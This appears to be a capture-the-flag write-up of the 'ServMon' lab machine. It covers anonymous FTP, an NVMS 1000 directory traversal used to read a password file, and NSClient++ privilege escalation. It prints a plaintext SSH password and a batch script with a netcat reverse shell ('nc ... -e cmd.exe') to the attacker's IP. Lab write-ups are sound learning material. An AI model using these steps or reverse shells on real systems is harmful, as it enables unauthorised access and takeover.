<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>servmon</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><h1><b><u><img src="{{site.baseurl}}/assets/images/servmon/servmon.png"/></u></b></h1>nmap scan reveals a bunch of interesting open ports<br /><img src="{{site.baseurl}}/assets/images/servmon/1-1.png" alt="{{site.baseurl}}/assets/images/servmon/1-1.png" /><br /><br />ftp allows anonymous login, and we find a few interesting txt files:<br /><img src="{{site.baseurl}}/assets/images/servmon/1-2.png" alt="{{site.baseurl}}/assets/images/servmon/1-2.png" /><br /><img src="{{site.baseurl}}/assets/images/servmon/1-3.png" alt="{{site.baseurl}}/assets/images/servmon/1-3.png" /><br /><br />the http server is hosting nvms 1000 that has a directory traversal exploit : <a href="https://www.exploit-db.com/exploits/48311">CVE-2019-20085</a><br /><img src="{{site.baseurl}}/assets/images/servmon/1-4.png" alt="{{site.baseurl}}/assets/images/servmon/1-4.png" /><br />using this exploit we read the Passwords.txt file Nadine told Nathan about<br /><br /><img src="{{site.baseurl}}/assets/images/servmon/1-5.png" alt="{{site.baseurl}}/assets/images/servmon/1-5.png" /><br /><br />"L1k3B1gBut7s@W0rk" allows us to login as Nadine on ssh. User owned<br /><img src="{{site.baseurl}}/assets/images/servmon/1-6.png" alt="{{site.baseurl}}/assets/images/servmon/1-6.png" /><br /><br />some windows enumeration and we find NSClient++ is installed, which has a <a href="https://www.exploit-db.com/exploits/46802">privesc exploit</a><br /><br />so we do as the exploit says and add a script to C:\Temp<br /><div class="codebox"><div class="codebox">@echo&nbsp;off<br />nc&nbsp;10.10.16.16&nbsp;4444&nbsp;-e&nbsp;cmd.exe</div></div><br /><br />also copy nc.exe over to the machine<br /><br />then add a script at nsclient++ interface (the credentials can be found in C:\Program Files\NSClient++\nsclient.ini)<br /><img src="{{site.baseurl}}/assets/images/servmon/1-7.png" alt="{{site.baseurl}}/assets/images/servmon/1-7.png" /><br /><br />and then insted of adding a autorun timer via the scheduler, directly run in from the queries section<br /><img src="{{site.baseurl}}/assets/images/servmon/1-8.png" alt="{{site.baseurl}}/assets/images/servmon/1-8.png" /><br /><br />check the nc listener and we have root<br /><img src="{{site.baseurl}}/assets/images/servmon/1-9.png" alt="{{site.baseurl}}/assets/images/servmon/1-9.png" /><br /><br />this was definetly a very intersting machine to solve</body></html>